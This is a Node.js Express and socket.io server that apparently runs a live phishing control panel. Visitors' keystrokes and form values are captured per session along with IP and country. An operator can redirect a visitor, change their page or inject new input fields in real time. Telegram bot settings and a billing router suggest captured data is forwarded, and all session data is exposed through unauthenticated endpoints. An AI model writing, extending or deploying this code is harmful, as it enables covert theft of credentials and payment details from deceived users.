const express = require("express");
const app = express();
const http = require("http").createServer(app);
const io = require("socket.io")(http, {
  path: "/realtimews",
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  },
  pingInterval: 25000,
  pingTimeout: 50000,
  transports: ["websocket", "polling"],
});

const axios = require("axios");
const { getClientIp } = require("request-ip");
const fs = require("fs");
const path = require("path");
const mongoose = require("mongoose");
require("dotenv").config();
const morgan = require("morgan");
const cookieParser = require("cookie-parser");
const cors = require("cors");
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 60 * 1000, 
    max: 100,  
    message: "Too many requests from this IP, please try again later"
});
mongoose
  .connect(process.env.DATABASE, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
    useFindAndModify: false, 
    serverSelectionTimeoutMS: 30000, 
    socketTimeoutMS: 45000
  })
  .then(() =>
    console.log(
      "==============Mongodb Database Connected Successfully=============="
    )
  )
  .catch((err) => console.log("Database Not Connected !!!"));

app.use(morgan("dev"));
app.use(cookieParser());
app.use(cors({
  origin: function (origin, callback) {
    const allowedOrigins = process.env.CLIENT_URL ? process.env.CLIENT_URL.split(',') : [];
    
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));

app.use(express.static("public"));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.set('trust proxy', true);

const telegramRouter = require('./routes/telegram');
const authRouter = require("./routes/auth");
const billingRouter = require("./routes/billing");
const userRouter = require("./routes/user");

app.use("/api/user", userRouter);
app.use("/api/auth", authRouter);
app.use("/api/authenticate", billingRouter);
app.use("/api", authRouter);
app.use('/api', telegramRouter);
const { loginCheck } = require("./middleware/auth");
let activeUsers = [];
let previousUsers = [];
let userInputs = {};
const ipCache = {};
let sessionMessages = {}; 
const dataFilePath = path.join(__dirname, "userSessions.txt");
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAD_ID = process.env.TELEGRAM_CHAT_ID;
try {
  if (fs.existsSync(dataFilePath)) {
    const data = JSON.parse(fs.readFileSync(dataFilePath, 'utf8'));
    activeUsers = data.activeUsers || [];
    previousUsers = data.previousUsers || [];
    userInputs = data.userInputs || {};
  }
} catch (error) {
  console.error('Error loading saved data:', error);
}

const saveDataToFile = () => {
  const data = {
    activeUsers,
    previousUsers,
    userInputs
  };
  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
};

//app.use("/api/", limiter);  // Apply to API routes

app.post("/api/analytics", async (req, res) => {
  const { sessionId, pageUrl, eventType, inputName, inputValue, componentName, browserInfo } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
	if (!ip) {console.error('IP undefined');
	return res.status(400).json({ error : 'IP undefined'});
};
  try {
    let country = ipCache[ip] || 'Unknown';
    if (!ipCache[ip]) {
      try {
        const geoResponse = await axios.get(`https://ipinfo.io/${ip}/json?token=${process.env.IPINFO_TOKEN}`);
        country = geoResponse.data.country;
        ipCache[ip] = country;
      } catch (error) {
        console.error('IP tracking error:', error);
      }
    }

    if (eventType === 'input') {
      if (!userInputs[sessionId]) {
        userInputs[sessionId] = {};
      }
      userInputs[sessionId][inputName] = { value: inputValue, timestamp: new Date() };
    }

    const user = {
      sessionId,
      ip,
      country,
      pageUrl,
      eventType,
      componentName,
      browserInfo,
      inputs: userInputs[sessionId] || {},
      lastActive: new Date(),
      timestamp: new Date()
    };

    const existingUserIndex = activeUsers.findIndex(u => u.sessionId === sessionId);
    if (existingUserIndex !== -1) {
      activeUsers[existingUserIndex] = { ...activeUsers[existingUserIndex], ...user };
    } else {
      activeUsers.push(user);
    }

    if (eventType === 'page_unload') {
      const userIndex = activeUsers.findIndex(u => u.sessionId === sessionId);
      if (userIndex !== -1) {
        const disconnectedUser = { ...activeUsers[userIndex], disconnectedAt: new Date() };
        previousUsers.push(disconnectedUser);
        activeUsers.splice(userIndex, 1);
      }
    }

    saveDataToFile();
    io.emit("update", { activeUsers, previousUsers });
    res.sendStatus(200);
  } catch (error) {
    console.error('Tracking error:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});


setInterval(() => {
  const twoMinutesAgo = new Date(Date.now() - 120000);
  const inactiveUsers = activeUsers.filter(user => new Date(user.lastActive) < twoMinutesAgo);
  
  if (inactiveUsers.length > 0) {
    previousUsers = [...previousUsers, ...inactiveUsers.map(user => ({
      ...user,
      disconnectedAt: new Date()
    }))];
    previousUsers = previousUsers.slice(-50); // Keep only last 50 previous users
  }
  
  activeUsers = activeUsers.filter(user => new Date(user.lastActive) >= twoMinutesAgo);
  saveDataToFile();
  io.emit("update", { activeUsers, previousUsers });
}, 30000);

app.post("/api/change-route", (req, res) => {
  const { sessionId, newRoute } = req.body;
  console.log(`Changing route for session ${sessionId} to ${newRoute}`);

  try {
    const sockets = Array.from(io.sockets.sockets.values());
    const targetSocket = sockets.find(socket => socket.handshake.auth.sessionId === sessionId);

    if (targetSocket) {
      targetSocket.emit("changeRoute", newRoute);
      console.log(`Route change emitted to socket ${targetSocket.id}`);
      
      const userIndex = activeUsers.findIndex(u => u.sessionId === sessionId);
      if (userIndex !== -1) {
        activeUsers[userIndex] = {
          ...activeUsers[userIndex],
          pageUrl: newRoute,
          lastRouteChange: new Date()
        };
        saveDataToFile();
        io.emit("update", { activeUsers, previousUsers });
      }
      res.sendStatus(200);
    } else {
      console.log(`No socket found for session ${sessionId}`);
      res.status(404).json({ error: 'User not found' });
    }
  } catch (error) {
    console.error('Error changing route:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post("/api/update-component", (req, res) => {
  const { sessionId, componentName, updates, route } = req.body;
  
  const sockets = Array.from(io.sockets.sockets.values());
  const targetSocket = sockets.find(socket => socket.handshake.auth.sessionId === sessionId);

  if (targetSocket) {
    targetSocket.emit("componentUpdate", {
      component: componentName,
      data: updates
    });

    targetSocket.emit("changeRoute", route);

    const userIndex = activeUsers.findIndex(u => u.sessionId === sessionId);
    if (userIndex !== -1) {
      activeUsers[userIndex] = {
        ...activeUsers[userIndex],
        currentComponent: componentName,
        componentData: updates,
        lastRoute: route,
        lastUpdate: new Date()
      };
      saveDataToFile();
      io.emit("update", { activeUsers, previousUsers, userInputs });
    }
    res.sendStatus(200);
  } else {
    res.status(404).json({ error: 'User not found' });
  }
});

app.post("/api/updateUserId", (req, res) => {
  const { oldUserId, newUserId } = req.body;
  activeUsers = activeUsers.map(user => user.userId === oldUserId ? { ...user, userId: newUserId } : user);
  saveDataToFile();
  io.emit("update", activeUsers);
  res.sendStatus(200);
});

app.get("/api/users", (req, res) => {
  res.json(activeUsers);
});

app.get("/api/previous-users", (req, res) => {
const sortedPreviousUsers = previousUsers.sort((a, b) => new Date(b.disconnectedAt) - new Date(a.disconnectedAt));
  res.json(sortedPreviousUsers);
});

// Serve userSessions.txt as JSON
app.get("/api/user-sessions", (req, res) => {
  fs.readFile(dataFilePath, "utf-8", (err, data) => {
    if (err) {
      console.error("Error reading userSessions.txt:", err);
      return res.status(500).json({ error: "Internal Server Error" });
    }
    try {
      const jsonData = JSON.parse(data);
      res.json(jsonData);
    } catch (parseError) {
      console.error("Error parsing userSessions.txt:", parseError);
      res.status(500).json({ error: "Internal Server Error" });
    }
  });
});

app.get("/api/get-input-config/:sessionId", (req, res) => {
  const { sessionId } = req.params;
  const inputsConfig = userInputs[sessionId] ? userInputs[sessionId].inputsConfig : null;
  if (inputsConfig) {
    res.json({ inputsConfig });
  } else {
    res.status(404).json({ error: 'Input configuration not found' });
  }
});

let configCheckInterval;
const configCheckLimit = 5; // Limit the number of calls
let configCheckCount = 0;
const failedSessionIds = new Set(); // Track session IDs that have failed
const requestLimit = 1; // Allow 1 request per session per interval
const intervalTime = 3000; // 3 seconds
const requestTimestamps = {}; // Track request times per session

const startConfigCheck = () => {
  configCheckInterval = setInterval(async () => {
    if (configCheckCount >= configCheckLimit) {
      stopConfigCheck();
      return;
    }

    for (const sessionId in userInputs) {
      if (failedSessionIds.has(sessionId)) {
        continue; // Skip session IDs that have previously failed
      }

      const currentTime = Date.now();
      const lastRequestTime = requestTimestamps[sessionId] || 0;

      if (currentTime - lastRequestTime < intervalTime) {
        continue; // Skip if the last request was made within the limit
      }

      try {
        const response = await axios.get(`${process.env.CLIENT_URL}/api/get-input-config/${sessionId}`);
        if (response.status === 200) {
          const inputsConfig = response.data.inputsConfig;
          io.to(sessionId).emit('configUpdate', { sessionId, inputsConfig });
          requestTimestamps[sessionId] = currentTime; // Update last request time
        } else {
          throw new Error('Input configuration not found');
        }
      } catch (error) {
        //console.error(`Error fetching input configuration for session ${sessionId}:`, error);
        if (error.response && error.response.status === 404) {
          failedSessionIds.add(sessionId); // Add to failed session IDs if 404 error
        }
      }
    }

    configCheckCount++;
  }, 1000); // Loop through session IDs every second, but each session limited individually
};

const stopConfigCheck = () => {
  clearInterval(configCheckInterval);
  configCheckCount = 0; // Reset the count
};

const getUserSocketBySessionId = (sessionId) => {
  const sockets = Array.from(io.sockets.sockets.values());
  return sockets.find(socket => socket.handshake.auth.sessionId === sessionId);
};

io.on("connection", (socket) => {
  const sessionId = socket.handshake.auth.sessionId;
  console.log(`Client connected: ${socket.id}, Session: ${sessionId}`);
  
  socket.sessionId = sessionId;
  
  socket.emit("update", { activeUsers, previousUsers, userInputs });

  socket.on('redirectUser', ({ sessionId, url }) => {
    const userSocket = getUserSocketBySessionId(sessionId);
    if (userSocket) {
      userSocket.emit('redirectUser', { url });
    }
  });

  socket.on('addCustomInput', ({ sessionId, input }) => {
    console.log('Received addCustomInput event:', { sessionId, input });
    io.emit('addCustomInput', { sessionId, input });
  });

  socket.on('configureInputs', ({ sessionId, inputsConfig }) => {
    console.log('Received configureInputs event:', { sessionId, inputsConfig });
    userInputs[sessionId] = { ...userInputs[sessionId], inputsConfig }; // Merge the configuration
    io.emit('configureInputs', { sessionId, inputsConfig });
  });

  socket.on('disconnect', () => {
    console.log(`Client disconnected: ${socket.id}, Session: ${sessionId}`);
  });
});

// Add error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});

// Run Server
const PORT = process.env.PORT || 8000;
http.listen(PORT, () => {
  console.log("Server is running on ", PORT);
});
